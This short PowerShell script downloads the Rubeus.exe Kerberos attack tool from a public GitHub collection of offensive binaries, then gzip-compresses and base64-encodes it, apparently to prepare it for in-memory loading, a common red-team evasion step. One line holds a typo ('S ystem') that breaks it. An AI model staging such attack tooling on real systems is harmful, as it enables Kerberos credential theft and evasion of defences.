function Invoke-Download-Raw-To-Compressed {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$true)]
        [String] $Url
    )
    [byte[]] $bytes = (New-Object S ystem.Net.WebClient).DownloadData($Url)
    $output = New-Object System.IO.MemoryStream
    $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
    $gzipStream.Write( $bytes, 0, $bytes.Length )
    $gzipStream.Close()
    $encoded = [System.Convert]::ToBase64String($output.ToArray())
    Write-Output $encoded
}
$u = "https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.0_Any/"
$f="Rubeus.exe"
Invoke-Download-Raw-To-Compressed -Url $u$f
